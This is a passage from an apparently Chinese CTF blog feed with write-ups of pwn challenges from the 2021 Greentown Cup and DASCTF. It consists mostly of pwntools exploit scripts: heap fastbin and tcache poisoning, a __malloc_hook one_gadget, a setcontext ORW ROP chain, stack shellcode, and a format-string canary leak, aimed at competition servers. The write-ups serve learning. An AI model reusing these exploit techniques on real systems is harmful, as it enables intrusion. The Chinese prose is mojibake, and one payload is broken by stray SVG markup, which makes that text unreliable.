class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929172949043.png" alt="image-20210929172949043"></p><p>ç¨‹åºå­˜åœ¨UAFï¼Œå€Ÿç€UAFæŠŠå †å—åŠ«æŒåˆ°tcacheä¸Šï¼Œè·å¾—libcï¼ŒåŒæ—¶ä¿®æ”¹tcacheç»“æ„ï¼Œè·å¾—ä»»æ„åœ°å€å†™</p><p>å› ä¸ºå¼€äº†æ²™ç®±ï¼Œæ‰€ä»¥å †ä¸Šå¸ƒç½®ropé“¾è¿›è¡Œorw</p><p>æœ€åé‡Šæ”¾å †å—è§¦å‘setcontextå»æ‰§è¡Œåˆ°rop</p><p>å˜¿å˜¿ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´çš„å­¦ä¹ ï¼Œæ€»ç®—æŒæ¡äº†è¿™ç§åœ¨å †ä¸Šå¸ƒç½®ropé“¾çš„æ‰‹æ³•äº†ï¼Œè¯¥å»å­¦ä¹ æ–°çš„çŸ¥è¯†äº†ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./GreentownNote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>, <span class="hljs-number">52301</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt; Note size :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;&gt; Content :&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;| Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">0xf8</span>,p64(heap_base + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>flag_addr = heap_base + <span class="hljs-number">0x260</span><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span> + p64(free_hook) + p64(heap_base + <span class="hljs-number">0x1000</span>) + p64(heap_base + <span class="hljs-number">0x10c0</span>))<br>add(<span class="hljs-number">0xa0</span>,p64(setcontext))<br>add(<span class="hljs-number">0xb8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span> + p64(heap_base + <span class="hljs-number">0x10c0</span>) + p64(ret)) <br>add(<span class="hljs-number">0xc8</span>,rop)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ¬¡PWNé¢˜å¯¹æˆ‘è¿™ç§pwnğŸ‘¶å¯ç®—æ˜¯å‹å¥½è‡³æé˜¿ï¼Œæ„Ÿå—ä¸€ä¸‹å¤§ä½¬åœ¨æ¯”èµ›ä¸­çš„æ€ç©¿çš„å¿«æ„Ÿï¼ä¸è¿‡è¿˜æ˜¯ä¸è¦è¢«è¿™äº›å‡è±¡è¿·äº†çœ¼ï¼Œå…¶å®è¿˜æ˜¯ä¸ªè¹’è·šå­¦æ­¥çš„pwnï¿½</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021ä¹æœˆDASCTF</title>
    <link href="http://example.com/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/"/>
    <id>http://example.com/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/</id>
    <published>2021-09-28T06:48:08.000Z</published>
    <updated>2021-10-13T08:01:25.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªæ¯”èµ›å…¶å®æ˜¯æ²¡æŠ±ç€å¾ˆè®¤çœŸçš„æ€åº¦å»æ‰“çš„ï¼Œå¯èƒ½ç”±äºä¸€è´¯çš„å°è±¡ï¼Œä¸‹æ„è¯†è§‰å¾—å®‰æ’æœˆèµ›ï¼Œä¸æ˜¯æˆ‘è¿™ç§å°èœé¸¡èƒ½çœ‹çš„ï¼Œæ¯•ç«Ÿä»å»å¹´å¹´å°¾å­¦åˆ°ç°åœ¨ï¼Œè¿™ç§æ¯”èµ›æˆ‘éƒ½æ˜¯æ¥å‡‘äººå¤´çš„ã€‚ä½†æ˜¯è¿™æ¬¡ï¼Œå¯æƒœäº†ï¼Œåé¢çœ‹äº†ä¸‹å¸ˆå‚…çš„wpï¼Œå‘ç°ï¼Œç«Ÿç„¶ä¸éš¾ï¼Œæ‰€ä»¥å‡ºç¯‡åšå®¢å¤ç°ä¸€ä¸‹å§ï¼Œè¿™æ˜¯åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå”¯ä¸€å…¨éƒ¨pwné¢˜éƒ½æ˜¯æˆ‘èƒ½åšçš„äº†ï¼Œä¹Ÿè®¸ï¼Œè¿™å°±æ˜¯è¿›æ­¥äº†å§ï¼Œå²æœˆæ¼«é•¿ï¼Œå€¼å¾—æœŸå¾…ï¼</p><p>æ¥æºï¼š<a href="http://rencvn.top/2021/09/26/PWN32/">http://rencvn.top/2021/09/26/PWN32/</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p><h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152753508.png" alt="image-20210928152753508"></p><p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨æ²¡å¼€ï¼Œç¬¬ä¸€æƒ³æ³•å°±æ˜¯æ‰§è¡Œshellcode</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152907622.png" alt="image-20210928152907622"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152921816.png" alt="image-20210928152921816"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152851336-16328141798011.png" alt="image-20210928152851336"></p><p>é¦–å…ˆï¼Œä¼šæœ‰ä¸ªè¾“å…¥ç‚¹ï¼Œå¹¶ä¸”è¿˜ä¼šæ‰“å°æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥æ»¡0x20ä¸ªå­—ç¬¦ï¼Œå°±ä¼šè¿ç€rbpä¸€èµ·æ³„éœ²å‡ºæ¥ï¼Œè·å–åˆ°æ ˆä¸Šåœ°å€ï¼Œåé¢è¿˜è´´å¿ƒçš„ç»™äº†æ ˆæº¢å‡ºã€‚</p><p>é‚£å°±æ˜ç¡®äº†ï¼šæ ˆä¸Šå†™å…¥shellcodeï¼Œå€Ÿç”¨å¾—åˆ°æ¥çš„æ ˆä¸Šåœ°å€ç®—å‡ºshellcodeå†™å…¥çš„åœ°å€ï¼Œå°†è¿™ä¸ªåœ°å€å¡«å……åˆ°è¿”å›åœ°å€å»ï¼Œç„¶åæ‰§è¡Œshellcode</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153222539.png" alt="image-20210928153222539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./bypwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29608</span>)<br>p.recvuntil(<span class="hljs-string">&quot;well you input:\n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack_addr==&gt;0x%x&quot;</span> %stack_addr)<br>p.recvuntil(<span class="hljs-string">&quot;EASY PWN PWN PWN~\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>payload = shellcode.ljust(<span class="hljs-number">88</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="hljs-number">80</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145300688.png" alt="image-20210928145300688"></p><p>å¸¸è§„checksecï¼Œ64ä½ï¼Œæ²¡å¼€PIEï¼ŒRELROä¹Ÿæ²¡å¼€å…¨</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145345926.png" alt="image-20210928145345926"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145402864.png" alt="image-20210928145402864"></p><p>ç¨‹åºä¹Ÿååˆ†ç®€å•ï¼Œä½†æ˜¯å¼€äº†æ²™ç®±ï¼Œæ‰€ä»¥æ˜¯orwã€‚ç»™äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ³„éœ²canaryçš„ï¼Œä»¥åŠä¸€ä¸ªæ˜æ˜¾æ ˆæº¢å‡ºã€‚</p><p>æ‰€ä»¥æ€è·¯å¾ˆæ˜ç¡®çš„ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡ºcanaryï¼Œå…¶å®ç”±äºé•¿åº¦å¤Ÿï¼Œè¿˜èƒ½å†å¤šæ³„éœ²ä¸€ä¸ªå¯„å­˜å™¨æˆ–è€…æ ˆä¸Šå­˜å‚¨çš„å‡½æ•°åœ°å€ï¼Œä»è€Œè·å–libcåœ°å€ï¼Œç„¶åå‘¢ï¼Œè¿™è¾¹æ³„éœ²çš„é€‰æ‹©å¯„å­˜å™¨ä¸Šçš„æ²¡é—®é¢˜ï¼Œåˆšå¼€å§‹æˆ‘æ˜¯é€‰æ‹©æ ˆä¸Šçš„stdinï¼Œç„¶åå‘ç°è¿œç¨‹è¿™ä¸ªæ‰“å°å‡ºæ¥æ˜¯ç©ºçš„</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152412946.png" alt="image-20210928152412946"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152432248.png" alt="image-20210928152432248"></p><p>æ¢æˆå¯„å­˜å™¨ä¸Šçš„libcåœ°å€å°±è¡Œäº†ã€‚æ‹¥æœ‰äº†libcå’Œcanaryåå°±å¯ä»¥ç€æ‰‹å¸ƒç½®ropäº†ï¼Œæˆ‘çš„åšæ³•æ˜¯ä½¿ç”¨mprotectä¿®æ”¹æƒé™ç„¶åè·³è½¬åˆ°readå‡½æ•°è¿›è¡Œå†™å…¥shellcodeï¼Œæœ€åè·³è½¬shellcodeæ‰§è¡Œè¯»å–flagã€‚å¸ˆå‚…çš„åšæ³•å°±æ˜¯ç›´æ¥ç”¨ropè¿›è¡Œopenï¼Œreadï¼Œwriteçš„è°ƒç”¨è¯»å–flag</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152051899.png" alt="image-20210928152051899"></p><p>è¿™é¢˜æœ‰ç‚¹å‘ï¼Œçœ‹äº†å¸ˆå‚…çš„wpä¹ŸçŸ¥é“äº†ï¼Œç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå®˜æ–¹ç»™çš„é™„ä»¶é‡Œçš„libcç‰ˆæœ¬æ˜¯è·Ÿè¿œç¨‹é¶æœºå·®äº†ä¸€ä¸ªå°ç‰ˆæœ¬çš„ï¼ŒæŠŠlibcæ¢æˆ2.23-0ubuntu11.3å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27901</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Welcome! What is your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.259ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 542 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title"><title id="MathJax-SVG-1-Title">p%27</title><defs aria-hidden="true"><path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true"> <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/></g></svg>p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf73c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;canary==&gt;0x%x&quot;</span> %canary)<br>p.recvuntil(<span class="hljs-string">&quot;What can we help you?\n&quot;</span>)<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base <br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000021112</span><br>pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x601000</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(bss) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss + <span class="hljs-number">0x80</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read)<br>payload += p64(bss + <span class="hljs-number">0x80</span>)<br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>) <br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153319183.png" alt="image-20210928153319183"></p><p>checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p>è¿™é¢˜æ˜¯ä¸‰é¢˜é‡Œé¢æœ€å¤æ‚çš„ä¸€é¢˜ï¼Œå› ä¸ºåœ¨è¿›å…¥çœŸæ­£çš„ç¨‹åºå‰ï¼Œæœ‰ä¸€ä¸ªç™»é™†ç¨‹åºï¼Œæ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦èŠ±æ—¶é—´è¿›è¡Œå®¡è®¡</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928154615068.png" alt="image-20210928154615068"></p><p>å¼€äº†æ²™ç®±</p><p><img 